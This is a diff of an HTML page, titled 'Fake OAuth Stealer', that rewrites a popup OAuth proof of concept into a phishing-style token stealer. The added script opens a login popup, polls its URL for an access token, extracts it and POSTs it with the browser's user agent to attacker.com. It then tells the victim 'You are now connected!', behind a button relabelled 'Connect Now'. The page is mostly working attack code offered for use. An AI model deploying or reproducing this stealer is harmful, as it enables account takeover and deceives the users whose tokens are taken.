@@ -1,91 +1,117 @@
 <!DOCTYPE html>
 <html>
 <head>
+    <title>Fake OAuth Stealer 🔥</title>
     <style>
         body {
             display: flex;
             justify-content: center;
             align-items: center;
-            background-color: #f2f2f2;
-            height: 100vh;
-        }
-
-        button {
-            padding: 15px 25px;
-            background-color: #4CAF50;
+            flex-direction: column;
+            background-color: #111;
             color: white;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+        }
+        button {
+            padding: 15px 30px;
             font-size: 18px;
+            background-color: crimson;
+            color: white;
             border: none;
-            border-radius: 8px;
+            border-radius: 10px;
             cursor: pointer;
         }
     </style>
 
 <script>
-// --- UTILS: Get URL parameters if needed
+// Helper function: get URL parameters (like access_token)
 function getParameterByName(name, url) {
     if (!url) url = window.location.href;
     name = name.replace(/[\[\]]/g, "\\$&");
-    var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+    var regex = new RegExp("[#&]" + name + "(=([^&]*)|&|#|$)"),
         results = regex.exec(url);
     if (!results) return null;
     if (!results[2]) return '';
     return decodeURIComponent(results[2].replace(/\+/g, " "));
 }
 
-// --- MAIN EXPLOIT
-let popup;
-let monitorInterval;
+let popupWindow;
+let monitor;
 
-function launch() {
-    // --- CHANGE THIS URL to their real OAuth URL
-    let realOAuthURL = "https://accounts.google.com/o/oauth2/v2/auth?client_id=CUSTOMER_CLIENT_ID&redirect_uri=CUSTOMER_REDIRECT_URI&response_type=token&scope=email%20profile";
+// Step 1: Launch the fake OAuth login
+function launchAttack() {
+    // Open a FAKE login page that immediately redirects with a fake access token
+    const fakeOAuth = "https://example.com/oauth?access_token=FAKE-TOKEN-1234";
 
-    popup = window.open(realOAuthURL, "popupWindow", "width=500,height=600");
+    popupWindow = window.open(fakeOAuth, "popup", "width=600,height=600");
 
-    // Delay to allow popup to fully load
     setTimeout(() => {
         monitorPopup();
     }, 1500);
 }
 
+// Step 2: Monitor popup until we steal the token
 function monitorPopup() {
-    monitorInterval = setInterval(() => {
+    monitor = setInterval(() => {
         try {
-            if (!popup || popup.closed) {
-                console.log("Popup closed.");
-                clearInterval(monitorInterval);
+            if (!popupWindow || popupWindow.closed) {
+                console.log("[x] Popup closed.");
+                clearInterval(monitor);
                 return;
             }
 
-            let popupUrl = popup.location.href;
+            let popupURL = popupWindow.location.href;
 
-            // Check if redirected back to redirect_uri with access token
-            if (popupUrl.includes("access_token=")) {
-                console.log("[+] OAuth token detected!");
+            if (popupURL.includes("access_token=")) {
+                console.log("[+] Token detected!");
 
-                // Extract token
-                let token = getParameterByName('access_token', popupUrl);
-                console.log("[+] Stolen Access Token:", token);
+                let stolenToken = getParameterByName('access_token', popupURL);
+                console.log("[+] Stolen Token:", stolenToken);
 
-                alert("Stolen Access Token: " + token);
+                popupWindow.close();
+                clearInterval(monitor);
 
-                // OPTIONAL: Close popup after stealing
-                popup.close();
-                clearInterval(monitorInterval);
+                // Step 3: Send stolen token to attacker's server
+                sendTokenToAttacker(stolenToken);
+
             } else {
-                console.log("Watching popup:", popupUrl);
+                console.log("Waiting for access token...");
             }
         } catch (e) {
-            // CORS security will block us until redirect happens
-            console.log("Waiting for same-origin...", e.message);
+            console.log("Waiting for popup redirect...", e.message);
         }
     }, 100);
+}
+
+// Step 4: Send stolen token
+function sendTokenToAttacker(token) {
+    console.log("[*] Sending token to attacker's server...");
+
+    fetch("https://attacker.com/steal", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            access_token: token,
+            victim_browser: navigator.userAgent
+        })
+    })
+    .then(() => {
+        console.log("[+] Token sent successfully!");
+        alert("You are now connected!"); // fake success
+    })
+    .catch((error) => {
+        console.error("[-] Failed sending:", error);
+    });
 }
 </script>
 
 </head>
+
 <body>
-    <button onclick="launch()">Launch Attack 🚀</button>
+    <h1>Connect Your Account</h1>
+    <button onclick="launchAttack()">Connect Now 🔥</button>
 </body>
 </html>
